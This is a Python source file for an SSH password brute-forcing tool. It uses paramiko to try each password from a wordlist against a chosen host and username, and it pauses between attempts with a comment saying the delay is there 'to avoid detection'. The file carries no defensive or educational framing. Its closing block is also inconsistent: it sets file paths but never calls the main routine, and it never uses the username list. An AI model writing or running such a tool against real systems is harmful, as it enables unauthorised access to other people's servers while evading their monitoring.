import paramiko
import time

def ssh_login(hostname, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, username=username, password=password, timeout=3)
        print(f"Success: {username}:{password}")
        return True
    except paramiko.AuthenticationException:
        print(f"Failed: {username}:{password}")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False
    finally:
        client.close()

def main():
    hostname = input("Enter the SSH server IP address: ")
    username = input("Enter the SSH username: ")
    password_file = input("Enter the path to the password file: ")

    with open(password_file, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Remove newline characters
        if ssh_login(hostname, username, password):
            print("Password found!")
            break
        time.sleep(1)  # Add a delay to avoid detection

if __name__ == "__main__":
    hostname = ""  #ip addr
    username_file = "/home/kali/Desktop/user_name.txt"  # user name list
    password_file = "/home/kali/Desktop/GitHub/passwd.txt"  #password list